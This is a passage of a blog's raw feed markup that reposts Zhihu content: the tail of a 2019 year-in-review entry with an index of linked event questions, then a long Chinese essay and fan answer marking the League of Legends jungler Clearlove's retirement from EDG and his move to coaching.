width="1920" data-original="https://pic3.zhimg.com/v2-cc60f093790c99d1d2528277cfbfa272_r.jpg" data-actualsrc="https://pic3.zhimg.com/v2-cc60f093790c99d1d2528277cfbfa272_b.jpg" data-lazy-status="ok" data-src="https://pic3.zhimg.com/80/v2-cc60f093790c99d1d2528277cfbfa272_hd.jpg"></figure><figure data-size="normal"><noscript><img data-caption data-size="normal" data-rawwidth="1163" data-rawheight="654" class="origin_image zh-lightbox-thumb lazyload" width="1163" data-original="https://pic4.zhimg.com/v2-7decbb6a588c2f490f4374863fb62a1b_r.jpg" data-src="https://pic4.zhimg.com/v2-7decbb6a588c2f490f4374863fb62a1b_b.jpg"></noscript><img data-caption data-size="normal" data-rawwidth="1163" data-rawheight="654" class="origin_image zh-lightbox-thumb lazy lazyload" width="1163" data-original="https://pic4.zhimg.com/v2-7decbb6a588c2f490f4374863fb62a1b_r.jpg" data-actualsrc="https://pic4.zhimg.com/v2-7decbb6a588c2f490f4374863fb62a1b_b.jpg" data-lazy-status="ok" data-src="https://pic4.zhimg.com/80/v2-7decbb6a588c2f490f4374863fb62a1b_hd.jpg"></figure><p class="ztext-empty-paragraph"><br></p><p>正在经历也即将过去的 2019</p><p>我们做好了漫长告别的准备</p><p>告别往复的时光和一些成人世界的「难」</p><p><b>知者无畏，知难而上</b></p><p>你好 2020</p><p class="ztext-empty-paragraph"><br></p><p>时间把已经发生的故事悄然搬离</p><p>但我们会记得</p><p>这是偶有荆棘却用「奇迹」披荆斩棘的十年</p><p>我们也要终要去创造下一个十年的未完待续</p><p>连同一些当初不悔的抉择</p><p>连同一些可抵岁月漫长的热爱</p><p><b>你好 下一个十年</b></p><p class="ztext-empty-paragraph"><br></p><hr><p><b>视频事件索引：</b></p><p>1、<a href="https://www.zhihu.com/question/307791077" class="internal" data-za-detail-view-id="1043">嫦娥四号成功着陆月球背面有什么重要意义？</a></p><p>2、<a href="https://www.zhihu.com/question/341908130" class="internal" data-za-detail-view-id="1043">亚马逊雨林大火十天会对地球产生什么影响？</a></p><p>3、<a href="https://www.zhihu.com/question/320308018" class="internal" data-za-detail-view-id="1043">巴黎圣母院突发火灾将产生怎样的影响？</a></p><p>4、<a href="https://www.zhihu.com/question/350043460" class="internal" data-za-detail-view-id="1043">如何看待 10 月 10 日无锡 312 国道高架倾覆事故？</a></p><p>5、<a href="https://www.zhihu.com/question/344397424" class="internal" data-za-detail-view-id="1043">男篮世界杯无缘东京奥运会，你有什么想说的？</a></p><p>6、<a href="https://www.zhihu.com/question/331830643" class="internal" data-za-detail-view-id="1043">宋仲基宋慧乔协议离婚，你有什么想说的？</a></p><p>7、<a href="https://www.zhihu.com/question/334238993" class="internal" data-za-detail-view-id="1043">如何看待 9 岁女童被租客带走，且租客自杀一事？</a></p><p>8、<a href="https://www.zhihu.com/question/352171277" class="internal" data-za-detail-view-id="1043">大连 10 岁女孩疑被 13 岁男学生杀害，案件调查进展如何？</a></p><p>9、<a href="https://www.zhihu.com/question/313564280" class="internal" data-za-detail-view-id="1043">第一批马上奔三的 90 后现在是什么样的状态？</a></p><p>10、<a href="https://www.zhihu.com/question/36892778" class="internal" data-za-detail-view-id="1043">如何看待互联网公司 996 现象，是种什么样的体验？</a></p><p>11、<a href="https://www.zhihu.com/question/318346341" class="internal" data-za-detail-view-id="1043">如何看待杭州小伙单车逆行被抓，接电话后崩溃爆哭？</a></p><p>12、<a href="https://www.zhihu.com/question/357980222" class="internal" data-za-detail-view-id="1043">艺人高以翔在录制节目抢救无效去世，发生了什么？</a></p><p>13、<a href="https://www.zhihu.com/question/350675490" class="internal" data-za-detail-view-id="1043">崔雪莉确认身亡，事情的真相如何？</a></p><p>14、<a href="https://www.zhihu.com/question/353884118" class="internal" data-za-detail-view-id="1043">如何看待锤子科技 CEO 罗永浩被限制高消费？</a></p><p>15、<a href="https://www.zhihu.com/question/324736734" class="internal" data-za-detail-view-id="1043">极限生存的假设成为现实，科技自立意味什么？</a></p><p>16、<a href="https://www.zhihu.com/question/340424050" class="internal" data-za-detail-view-id="1043">如何看待环球时报记者付国豪在香港机场的遭遇及后续？</a></p><p>17、<a href="https://www.zhihu.com/question/329189281" class="internal" data-za-detail-view-id="1043">羽毛球名将李宗伟宣布退役，如何评价他的职业生涯？</a></p><p>18、<a href="https://www.zhihu.com/question/319053644" class="internal" data-za-detail-view-id="1043">如何评价《青春有你》第十二期总决赛？</a></p><p>19、<a href="https://www.zhihu.com/question/311841841" class="internal" data-za-detail-view-id="1043">如何评价腾讯综艺《创造营 2019》？</a></p><p>20、<a href="https://www.zhihu.com/question/331546953" class="internal" data-za-detail-view-id="1043">如何评价影视剧《陈情令》？</a></p><p>21、<a href="https://www.zhihu.com/question/328571237" class="internal" data-za-detail-view-id="1043">如何评价电影《少年的你》？</a></p><p>22、<a href="https://www.zhihu.com/question/345307809" class="internal" data-za-detail-view-id="1043">如何评价周杰伦发布的新歌《说好不哭》？</a></p><p>23、<a href="https://www.zhihu.com/question/310186247" class="internal" data-za-detail-view-id="1043">如何评价动画电影《哪吒之魔童降世》？</a></p><p>24、<a href="https://www.zhihu.com/question/346282105" class="internal" data-za-detail-view-id="1043">看过电影《中国机长》后，你有什么感想？</a></p><p>25、<a href="https://www.zhihu.com/question/312591983" class="internal" data-za-detail-view-id="1043">如何评价苏炳添夺伯明翰室内大赛 60 米冠军？</a></p><p>26、<a href="https://www.zhihu.com/question/350351013" class="internal" data-za-detail-view-id="1043">如何看待基普乔格以 1 小时 59 分 40 秒破 2 成功？</a></p><p>27、<a href="https://www.zhihu.com/question/354106324" class="internal" data-za-detail-view-id="1043">孙杨听证会于 11 月 15 日举行，透露了哪些信息？</a></p><p>28、<a href="https://www.zhihu.com/question/299127794" class="internal" data-za-detail-view-id="1043">如何评价爱奇艺《乐队的夏天》？</a></p><p>29、<a href="https://www.zhihu.com/question/355167705" class="internal" data-za-detail-view-id="1043">如何看待 FPX 3:0 击败 G2，中国战队再夺 S 赛冠军？</a></p><p>30、<a href="https://www.zhihu.com/question/348219798" class="internal" data-za-detail-view-id="1043">中国女排第十次夺取世界冠军，你有什么想说的？</a></p><p>31、<a href="https://www.zhihu.com/question/342172376" class="internal" data-za-detail-view-id="1043">看完电影《我和我的祖国》，你有什么感想？</a></p><p>32、<a href="https://www.zhihu.com/question/348515819" class="internal" data-za-detail-view-id="1043">2019 年 10 月 1 日新中国成立 70 周年国庆大阅兵有哪些亮点？</a></p><p>33、<a href="https://www.zhihu.com/question/318657727" class="internal" data-za-detail-view-id="1043">如何评价电影《复仇者联盟 4 ：终局之战》？</a></p><p>34、<a href="https://www.zhihu.com/question/284128568" class="internal" data-za-detail-view-id="1043">如何评价刘慈欣小说改编的同名电影《流浪地球》？</a></p><p>35、<a href="https://www.zhihu.com/question/318763133" class="internal" data-za-detail-view-id="1043">人类首张黑洞照片即将发布，可能会有什么重要影响？</a></p><p></p></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;!--页面头部添加--&gt;

&lt;h1 id=&quot;2019-年度回顾视频：感谢一切难题！&quot;&gt;&lt;a href=&quot;#2019-年度回顾视频：感谢一切难题！&quot; class=&quot;headerlink&quot; ti
      
    
    </summary>
    
    
      <category term="感情生活" scheme="https://www.nikoyu.asia/categories/%E6%84%9F%E6%83%85%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="2019" scheme="https://www.nikoyu.asia/tags/2019/"/>
    
  </entry>
  
  <entry>
    <title>EDG 官宣 Clearlove（明凯）正式退役成为教练，你有什么想说的？</title>
    <link href="https://www.nikoyu.asia/Clearlove.html"/>
    <id>https://www.nikoyu.asia/Clearlove.html</id>
    <published>2019-12-17T01:39:44.000Z</published>
    <updated>2020-09-17T03:20:45.594Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><!--页面头部添加--><h1 id="EDG-官宣-Clearlove（明凯）正式退役成为教练，你有什么想说的？"><a href="#EDG-官宣-Clearlove（明凯）正式退役成为教练，你有什么想说的？" class="headerlink" title="EDG 官宣 Clearlove（明凯）正式退役成为教练，你有什么想说的？"></a>EDG 官宣 Clearlove（明凯）正式退役成为教练，你有什么想说的？</h1><p>&emsp;&emsp;“一片树林里分出两条路，而我选择了人迹更少的一条。” “从此决定了我一生的道路。”明凯退役了。在转会期的最后一天爆出这样的消息，即在意料之外，又在情理之中，八年前走上电子竞技这条道路，七年前为中国拿下第一个英雄联盟世界冠军 ，六年前从WE加入EDG，四年前为LPL拿下第一个官方赛事奖杯，三年前被挂上4396的名号，两年前开始将担子转给后辈，一年前在台下看着小将带领EDG冲向世界舞台。今年正式划上句号。厂长 、诺言 、MSI总MVP 、LPL第一打野 、艾欧尼亚深夜屠杀者 。反向证明世界第一打野 、4396 、马踏飞箭 、鱼死网破 、NMSLWSND 。前者是明凯，后者也是明凯，好也罢，坏也罢，走过八年职业生涯，很多荣辱和过去都已经被时间彻底冲散。该打过的仗都已经打过了，当击败的敌人都已经击败了，该守住的荣誉也已经守住了，自此以后，自有王者的冠冕为他存留 。名为选手的人生，已经结束。名为教练的征途，才刚刚开始。1.明凯的职业生涯，是由一款叫《信长野望》的游戏开始的，我们无需关注这款游戏的地位到底达到了什么地步，我们只需要知道LPL最早一批职业选手有不少都出自于此，包括明凯、无状态、卷毛等一系列老选手都是出自于此。而明凯离开信长野望转LOL的原因也非常简单——因为信长野望让他活不下去。站在今天的角度上，我们或许会觉得他走上职业这条路是为了梦想。但客观地说，在当时那个电子竞技远没有发展起来的时代，对于大多数早期的职业选手而言，梦想远远不及一张长期饭票重要。<img data-caption data-size="normal" data-rawwidth="453" data-rawheight="395" data-default-watermark-src="https://pic2.zhimg.com/50/v2-d466972b1fefa8c5bbe976903005f8fc_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="453" data-original="https://pic2.zhimg.com/v2-a599abe988f98383016856f783e842fe_r.jpg" data-src="https://pic2.zhimg.com/50/v2-a599abe988f98383016856f783e842fe_hd.jpg">&emsp;&emsp;世界冠军选手穿着皱巴巴的队服去挤地铁拉赞助，累的睡在人来人往的车厢里。一顿李庄白肉成为几个年轻小伙一辈子挥之不去的回忆，即使后来分道扬镳也记得清晰无比。无关梦想，无关荣誉，这才是那年电子竞技的残酷现状。而明凯加入的前两个战队，都不是那么有趣，其中一支战队的名字叫”蓝BiuBiu”，战队图标充满了二次元的气息，这支战队只存在了不到半年，后来被Team Phoenix战队 带走了其中大量队员。<img data-caption data-size="normal" data-rawwidth="156" data-rawheight="159" class="content_image lazyload" width="156" data-src="https://pic4.zhimg.com/50/v2-1bb6c01e6f1a671fb942d1ec29999615_hd.jpg">&emsp;&emsp;当然，Team Phoenix同样没有存在太久，否则今天的FPX战队或许还需要换一个名字，在8月加入WE战队后，他终于开始有了一份稳定的收入，按照上单草莓在退役后的曝光来看，这份收入并不算高，但作为职业生涯的开始，进入当时国内堪称豪门的WE俱乐部，无论如何都是一个相当不错的起点。<img data-caption data-size="normal" data-rawwidth="600" data-rawheight="400" data-default-watermark-src="https://pic3.zhimg.com/50/v2-99efab80ecb16f2e65795208fb54c8b6_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="600" data-original="https://pic3.zhimg.com/v2-56328e0fa0c84f5efe0f0160b20f7916_r.jpg" data-src="https://pic3.zhimg.com/50/v2-56328e0fa0c84f5efe0f0160b20f7916_hd.jpg">&emsp;&emsp;起点有了，结果却未必会太好，S2是一个非常有趣的时代，英雄联盟在全球尚没有搭建完整的联赛体系，大多数战队除了夺冠和赞助以外不会有太多收入。而鱼龙混杂的赛事又让大多数比赛到最后都成为了全球选手大乱斗的修罗场。风起云涌的赛场，日新月异的体系，加上拳头对于早期游戏版本和赛事力度都掌控不足，让WE对整个S2世界赛都无所适从。八小时的网线大战耗干了WE的精力，而道歉在老WE四位选手退役后才姗姗来迟。当然，这不重要。那年在拉斯维加斯，WE依旧一路过关斩将夺得了IPL末代冠军，先后击败了FNC、CLGEU、M5等多支强队的他们已经证明了自己的实力，国服客户端也增加了WE战队的永久免费头像。<img data-caption data-size="normal" data-rawwidth="640" data-rawheight="333" data-default-watermark-src="https://pic3.zhimg.com/50/v2-0280aa2f84827a4c4b01245ca822c2a3_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="640" data-original="https://pic3.zhimg.com/v2-14f350dfdc2f9d84db231be7d0f9feb9_r.jpg" data-src="https://pic3.zhimg.com/50/v2-14f350dfdc2f9d84db231be7d0f9feb9_hd.jpg">&emsp;&emsp;在S3那个英雄联盟肆无忌惮扩张的时候，WE头像是很多玩家的首选，甚至延续至今。但对于大多数玩家来说，那个时代的明凯并不出彩，相对于落地金身的若风，韩国队伍塔下跳舞嘲讽的草莓，乃至于号称国服第一机器人的卷毛和世界顶级ADC微笑。那个在前期被反野导致大逆风，最终强行顶起400真视药水强做视野的明凯，确实不够耀眼。但良好的开始，也往往是一个枷锁。2.2012的夺冠，给WE带来荣誉的同时，也带来了枷锁，中单实力下滑让WE无法保持以往的压制能力，下路的优势虽然依旧满满，但S3是一个刺客横冲直撞的版本。除了老对手IG和二队PE外，WE已经无法击败OMG和皇族这两个对手，春季赛进入季后赛憾负OMG的WE甚至无法击败IG这个老对手。被Ban掉寡妇的明凯在野区内横冲直撞，却无法保证比赛的胜利，骨子里渴望胜利的选手们内部很快爆发了冲突。很多队内冲突可以掩盖，但WE不行，因为我们马上就在赛场上看到了这一刻。<img data-caption data-size="normal" data-rawwidth="640" data-rawheight="359" data-default-watermark-src="https://pic4.zhimg.com/50/v2-b2478935e30da9215c0fef40a9172605_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="640" data-original="https://pic4.zhimg.com/v2-08140ec1fbcdbc4a8077a4166768cff1_r.jpg" data-src="https://pic4.zhimg.com/50/v2-08140ec1fbcdbc4a8077a4166768cff1_hd.jpg">&emsp;&emsp;2013年8月16日，LPL夏季赛WE vs LMQTC的比赛中，明凯和若风互换位置，明凯中单，若风打野，但这种临阵换位置自然不会有什么好事，作为联赛末流队伍的LMQTC轻松击败了WE并且打出了碾压性优势。这场比赛带来了两个灾难性的后果。1.因为被LMQ在常规赛多拿了一分的原因，WE以一分之差未能进入LPL夏季赛季后赛，而未进入夏季赛季后赛则丧失进入全球总决赛预选赛的机会。虽然进入了也不一定能从当时状态火热的OMG和皇族身上抢下名额，但没进入终究是没有进入。2.因为未能进入全球总决赛预选赛，丧失了进入全球总决赛的机会，WE五人内部矛盾进一步扩大，直接导致世界赛期间以及后续WCG相关的事件爆发。<img data-caption data-size="normal" data-rawwidth="640" data-rawheight="404" data-default-watermark-src="https://pic1.zhimg.com/50/v2-c08d84636d502692b6f0c7bc2dfe84cf_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="640" data-original="https://pic4.zhimg.com/v2-82fde92166b9a393cc73229617f4cb22_r.jpg" data-src="https://pic4.zhimg.com/50/v2-82fde92166b9a393cc73229617f4cb22_hd.jpg">&emsp;&emsp;即使是当事人在那时，也很难评价双方的对错，在2019年已经稀松平常的离队转会，在2013年似乎是有些罪大恶极的事情，不管选手私下如何，在微博上掀起的大战一时成为了年末最”精彩”的风景——即使几位选手在不久之后就冰释前嫌。无论怎么说，明凯和卷毛以及阿布的离队，对于当时的LPL来说并不算是坏事，WE的没落至少在那个时代已经无法阻止，而卷毛、明凯和阿布三人的出走，加上从PE转会而来的Namei以及曾经作为LM战队中单击败了他们的U，统治了LPL长达一年半的超级战队EDG诞生了。这支队伍在2019年确实战绩不佳，但在2014年建队开始到2018年末，EDG都一直是LPL最具竞争力的队伍之一，甚至在很长一段时间里，这个之一也可以去掉。<img data-caption data-size="normal" data-rawwidth="640" data-rawheight="444" data-default-watermark-src="https://pic4.zhimg.com/50/v2-0f11fb981e223895281cec79fd93ec7a_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="640" data-original="https://pic2.zhimg.com/v2-9bd2b753015e462f85a299378a280df6_r.jpg" data-src="https://pic2.zhimg.com/50/v2-9bd2b753015e462f85a299378a280df6_hd.jpg">&emsp;&emsp;一手将这个王朝打造而出的正是明凯，而在接下来的时间里，他依旧会亲手掌握这个他打造而出的巨轮继续前行。当然，这就是另一个故事了。3.2015年的EDG和明凯，都到了历史上最巅峰的状态，运营赛季让EDG的打法如鱼得水，而意识和操作乃至于职业经验都处于巅峰的明凯也开始在赛场上大杀四方。那年的他强到什么地步？LPL联赛历史上打野最高击杀记录并不是大多数人想象中的瞎子、狮子狗、螳螂、千珏此类英雄，甚至不是皇子、酒桶、奥拉夫这一类战士英雄，而是猪妹。<img data-caption data-size="normal" data-rawwidth="572" data-rawheight="341" data-default-watermark-src="https://pic3.zhimg.com/50/v2-f270a0181533b2597e21fb64af1aee05_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="572" data-original="https://pic1.zhimg.com/v2-415a4e40bd0e51cafbd1cd35911c803e_r.jpg" data-src="https://pic1.zhimg.com/50/v2-415a4e40bd0e51cafbd1cd35911c803e_hd.jpg">&emsp;&emsp;我知道这个结论会让大多数人惊掉眼镜，但这个记录确实是明凯2015年4月10日对VG的比赛中创造出来的。春季赛将自己一身实力发挥到顶峰的明凯打出了无数经典操作，猪妹15杀打崩VG、十分钟连续上中下三路狂抓21分钟打爆LGD，从有惩戒的努努手下抢到大龙最终让EDG夺得2015年春季赛冠军——那也是EDG夺得的最后一个春季赛冠军。我们不知道站在佛罗里达州立大学的场馆中，这位已经在英雄联盟里奋战了四年的职业选手是什么想法，但最终锁下寡妇的那一刻，以及对队员们的坚定眼神和话语，都说明了一件事：他来到这个地方，目的就是为了屠神。”We BO5 king，WE ，LGD，NOW SKT”漫天彩带落下，EDG最终3：2击败SKT拿下世界冠军，明凯在第一的2015年MSI季中邀请赛冠军的同时，也获得了季中邀请赛总MVP，而一直到今天为止，这都是LPL战队惟一一次在番战中击败SKT。<img data-caption data-size="normal" data-rawwidth="640" data-rawheight="417" data-default-watermark-src="https://pic3.zhimg.com/50/v2-c2a34e4670a5a660c4c36f979d4e90d9_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="640" data-original="https://pic1.zhimg.com/v2-a109431c8281ca60ce3374d5df49bd2c_r.jpg" data-src="https://pic1.zhimg.com/50/v2-a109431c8281ca60ce3374d5df49bd2c_hd.jpg">&emsp;&emsp;2015年季中邀请赛的出征曲叫做《Hero》，是时任IG中单宋义进（Rookie）和时任OMG中单余家俊（Cool）共同演唱。在MV的最后，音乐结束的时候，明凯对着镜头竖起了自己的大拇指。<img data-caption data-size="normal" data-rawwidth="640" data-rawheight="356" data-default-watermark-src="https://pic2.zhimg.com/50/v2-3973c1a4c6179d2fc5707a1d7a974c05_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="640" data-original="https://pic4.zhimg.com/v2-7c33348876a6dcb783610adfab4a5ad0_r.jpg" data-src="https://pic4.zhimg.com/50/v2-7c33348876a6dcb783610adfab4a5ad0_hd.jpg">&emsp;&emsp;相对于两年前他在全明星宣传的MV当中骄傲的说到”要证明谁才是世界第一打野。”这次他只是和其他队员一样，竖起了自己的大拇指。想要证明自己是世界第一打野，赛场上却成为了别人的背景板，成就瞎王inSec英名。平静的竖起大拇指带领队员远征佛罗里达，寡妇绝杀击败SKT，成为真正的第一打野。但让很多人没有想到的是，塔拉哈西的奖杯就已经是很多故事的终点。EDG和明凯，再也没达到过同样的高度。4.对于任何一个EDG粉丝而言，2015年MSI后的EDG，无论怎么谈都是一言难尽，在2018年IG夺得S8世界赛冠军之前，EDG一直是LPL外战成绩最好的队伍——RNG最多也只做到了平起平坐。但LPL的颓势以及EDG在联赛内部还不错的成绩，让很多压力也来到了EDG身上。”内战内行”的帽子一旦扣上，就很难再拿下来了，强大的舆论迫使EDG对自己稳健运营的节奏做出改变，在对外作战采用越来越激进的打法，但赛区的整体劣势让绝大多数队伍在外战时都堪称无力回天。<img data-caption data-size="normal" data-rawwidth="640" data-rawheight="400" data-default-watermark-src="https://pic1.zhimg.com/50/v2-119b89270e8e35f760ea31a6c317bcf4_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="640" data-original="https://pic2.zhimg.com/v2-610e73ca5768cb4ead3f7f995c412287_r.jpg" data-src="https://pic2.zhimg.com/50/v2-610e73ca5768cb4ead3f7f995c412287_hd.jpg">&emsp;&emsp;天塌下来自然要高个子顶着，作为LPL”最高”的EDG，被诟病非常正常，而在EDG里”最高的”明凯，各种各样的节奏自然会接踵而来。4396对于一个劣势局打野来说并不算奇怪，毕竟劣势局即使是C位也可能打不出多少输出，但朗朗上口外加玩家对失败的不满，让节奏迅速发酵，马踏飞箭虽然堪称经典一梗，但那场比赛EDG并没有输掉比赛，甚至”马踏飞箭”的明凯，那场比赛还拿下了堪称完美的1/0/8数据。但这并不重要，人们总是需要一个发泄口的。随之而来的S7全球总决赛小组赛三拿卢锡安被淘汰，让EDG彻底站在了风口浪尖之上，虽然现在的”御三家”都有小组赛被淘汰的历史（IG2015年、RNG2019年），但EDG这次的时间和地点都太不巧了一些。连续的成绩下滑让EDG不得不做出改变，年龄已经变大的明凯也逐渐开始淡出赛场。<img data-caption data-size="normal" data-rawwidth="640" data-rawheight="294" data-default-watermark-src="https://pic4.zhimg.com/50/v2-d12220f26226bad2d1388ccfa5a76043_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="640" data-original="https://pic2.zhimg.com/v2-ecea53362f79927d3a3e33b75039dd85_r.jpg" data-src="https://pic2.zhimg.com/50/v2-ecea53362f79927d3a3e33b75039dd85_hd.jpg">&emsp;&emsp;2018年春季赛尚可算是主力，到夏季赛的后期就基本上由Haro上场，冒泡赛9场比赛的表现让Haro稳住了自己在世界赛的地位，直到2019年EDG的彻底落寞。在2019年夏季赛，即使是最危机的时候，EDG依旧选择了新打野Jiejie上场，让明凯稳稳坐在了替补席上，已经说明了他接下来的去程。作为一名已经26岁的大龄选手，他已经没有再去试错的机会了。喜欢也好，不喜欢也罢，春季赛季后赛面对SDG那次被3：0，就是他在赛场上留下的最后痕迹，IPL5上逆风顶起400的茂凯，全明星上不知所措的人马，S4全球总决赛上绝望退场的螳螂，2015年强行抢龙的雷克赛，绝杀大魔王妖姬连胜纪录的恐怖寡妇，被自己”粉丝”盲僧当成背景板的蜘蛛，让二追三关键局EQ闪挑起对手的皇子，还有那个在最后一场比赛里无力回天的酒桶。<img data-caption data-size="normal" data-rawwidth="640" data-rawheight="435" data-default-watermark-src="https://pic3.zhimg.com/50/v2-b71a3a4a68212197490a60684a68d562_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="640" data-original="https://pic1.zhimg.com/v2-ca4ad677a37519c505bc0c575664f34e_r.jpg" data-src="https://pic1.zhimg.com/50/v2-ca4ad677a37519c505bc0c575664f34e_hd.jpg">&emsp;&emsp;年少成名，打职业第一年就夺得世界冠军，本来应该是主角剧本。呕心沥血，背负骂名换队抗韩绝杀大魔王，无论如何都难以忘记。拥有了该拥有的荣誉，击败了能击败的敌人，从LPL赛区建立开始走到今天，无论奖杯、荣誉还是知名度，都堪称LPL唯二存在 。但我们回顾这一段故事，却只留下了一段回忆和一声叹息。没能在职业生涯最后用一场战斗为自己退役划上句号，终究不是那么完美。5.18岁的明凯决定走上电子竞技这条道路，21岁的明凯用自己的双手开辟了完全不同的人生。或许对大多数粉丝来说，”背叛”WE前往EDG是一个不光彩的开始，而获得荣誉后的描述也更像是成王败寇的无趣语言。但在那个秋天的晚上他做出选择那一刻起，渴望胜利的灵魂就已经开始燃烧，成为铸就冠军奖杯的燃料。这条路痛苦、无趣又带着辉煌，即使结局会有些不尽人意，但正如弗罗斯特那首诗一样。“一片树林里分出两条路，而我选择了人迹更少的一条。” “从此决定了我一生的道路。”名为选手的人生，已经结束。名为教练的征途，才刚刚开始。作者：瓦罗兰文艺复兴联合会—— @框框框子编辑于昨天 21:12​赞同 9K​​419 条评论​分享​收藏​感谢​收起​吧啦是一只兔子/Lolita/JK制服/LOL/一拳一个装病狗1,319 人赞同了该回答“有人说电竞是青春饭，那我的青春，可能会久一点。”<img data-rawwidth="1620" data-rawheight="1080" data-size="normal" data-default-watermark-src="https://pic1.zhimg.com/50/v2-08659bdbc2ece03c68b2a6648b6f2ac0_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="1620" data-original="https://pic1.zhimg.com/v2-a55398a385406973c4d5c74a45039d17_r.jpg" data-src="https://pic1.zhimg.com/50/v2-a55398a385406973c4d5c74a45039d17_hd.jpg">&emsp;&emsp;12月16日，EDG选手Clearlove正式宣布退役，转型EDG教练。——这位26岁的LPL活化石，见证了LPL所有人同一起跑线的锐气，和被LCK统治的萎靡，到如今的世界第一赛区。他带着无数的赞誉和诋毁，确确实实地从舞台上落幕了。我是S6初开始入坑，作为一个萌新尝试着去了解英雄联盟。S5总决赛当时已经结束，铺天盖地的质疑和指责让我认识了EDG。之后每年世界赛EDG都承受着比上一年更多的舆论风暴，诺言成了万众瞩目也成了漩涡中心。在这样的环境下我也成了一名黑粉，内战幻神，4396，你号没了，克里尔辣舞，鱼死网破，马踏飞箭……lpl梗共十斗，厂长独占七斗。曾经不可一世的EDG摇摇欲坠，S7世界赛WE和RNG势如破竹，在麻辣香锅绝食型打野的反衬下，Clearlove7在舆论风暴中成了废物的代名词。那个7看起来如此讽刺，他所谓的梦想在很多人眼里只是舍不得名利。S7之后改朝换代，大家的聚焦点都在RNG，IG，FPX。EDG，那是谁？而我第一次意识到自己没那么讨厌明凯时，是王者荣耀一个我想不起来名字的选手，他所在的战队故意拿“诺言”和“辣个男人”的梗来发微博，他的女粉丝们嘲讽明凯不过是没有知名度的野鸡选手，他们的偶像才配叫诺言。哪怕作为一名激进厂黑，我也着实被恶心到了，当时我还在微博和那个王者荣耀选手的女粉对线了好几回。明凯的女粉说，“要守护全世界最好的诺言”。我只当脑残粉的肉麻言论，但我开始放下偏见去了解这个选手，才发现他不仅没我想象中那么菜，相反他至今都有着不容忽视的统治力——尽管他真的年纪大了。那次后我反省我自己，不了解一个选手的成就，不去肯定他有过的成绩，有什么资格说三道四呢？——<img data-rawwidth="580" data-rawheight="580" data-size="normal" data-default-watermark-src="https://pic4.zhimg.com/50/v2-2533f3abd69072d0cd8677d61b109460_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="580" data-original="https://pic2.zhimg.com/v2-a503766a44ee2b6312d4e2cb975990e3_r.jpg" data-src="https://pic2.zhimg.com/50/v2-a503766a44ee2b6312d4e2cb975990e3_hd.jpg">&emsp;&emsp;明凯不完全统计成就S2加入WE，彼时国内英雄联盟刚刚起步，这个梦幻般的战队夺得了IPL5世界冠军，玩家们头像选择里有了WE，——LPL向世界展示的第一道锋芒。S4转会新生队伍EDG，成为LOL职业联赛上第一次获得LPL春季赛和LPL夏季赛双冠军的队伍，同年获得德玛西亚杯冠军。S5EDG战队获得LPL春季赛冠军，对战LGD被称为“中国赛区史上最强BO5 ”，逆风、翻盘、视野控制、节奏、极限大五个、抢大龙、五杀，所有振奋人心的表现都在这场比赛中体现得淋漓尽致，是曾经在中国赛区能看到最巅峰的对决。明凯最终抢掉大龙，解说狂喊: 扶大厦之将倾，挽狂澜于既倒， 厂长真男人。同年MSI夺得冠军，打破LCK在世界性赛事的冠军垄断地位，同时这也是LPL第一次在拳头官方举办的全球性赛事中摘得桂冠。明凯成为中国第一位两次夺得LOL世界冠军的选手，赛事官方评为MVP。S6EDG战队获得LPL夏季赛冠军，明凯再次KDA榜单第一，自15年开始到今年，凡是Clearlove出场次数超过20场的比赛，他的KDA在打野位始终第一。S7EDG战队获得LPL夏季赛冠军，果断的二级抓下阻止了RNG的造神之路。MSI用百分百胜率的寡妇，终结了Faker百分百胜率妖姬的不败传说。英特尔公司请厂长代言广告，公开承认了LOL的地位，也有了那句经典名言——“世界聚焦于你。”<img data-rawwidth="2048" data-rawheight="1365" data-size="normal" data-default-watermark-src="https://pic3.zhimg.com/50/v2-e72b2bdbde083ece18535ee55d8161e3_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="2048" data-original="https://pic1.zhimg.com/v2-554a9a27388d86590947a4ee5c1eee15_r.jpg" data-src="https://pic1.zhimg.com/50/v2-554a9a27388d86590947a4ee5c1eee15_hd.jpg"><img data-rawwidth="459" data-rawheight="347" data-size="normal" data-thumbnail="https://pic4.zhimg.com/50/v2-4972e9b99928aa97330d1fc3153749e6_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="459" data-original="https://pic4.zhimg.com/v2-4972e9b99928aa97330d1fc3153749e6_r.jpg" data-src="https://pic4.zhimg.com/50/v2-4972e9b99928aa97330d1fc3153749e6_hd.gif">&emsp;&emsp;Faker直言希望明凯作为打野组队意识流打野，英雄池深到可以称为打野百科全书。别出一格的符文搭配与刷野路线让他在新赛季高分rank局里成为最速升级打野，并且广被模仿。他毫无疑问是LPL的图腾选手，毫无疑问地站在世界巅峰过。毁誉参半，至今也有不少人对他厌恶到极点。EDG承载过太多人的青春和希望，也一次次让人失望。水友赛里有个水友说，“我想看诺言再拿个冠军。”诺言原本打出的是“会”，删掉改成了“行”，最终打出来的却是“谢谢”。<img data-rawwidth="591" data-rawheight="255" data-size="normal" data-default-watermark-src="https://pic3.zhimg.com/50/v2-d7bd70baa312286881fd4d784be61683_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="591" data-original="https://pic1.zhimg.com/v2-fe22af4a8a541f202606e335d8800cd7_r.jpg" data-src="https://pic1.zhimg.com/50/v2-fe22af4a8a541f202606e335d8800cd7_hd.jpg"><img data-rawwidth="593" data-rawheight="229" data-size="normal" data-default-watermark-src="https://pic3.zhimg.com/50/v2-9e55ca7cf687d36e8c10e17f2822e524_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="593" 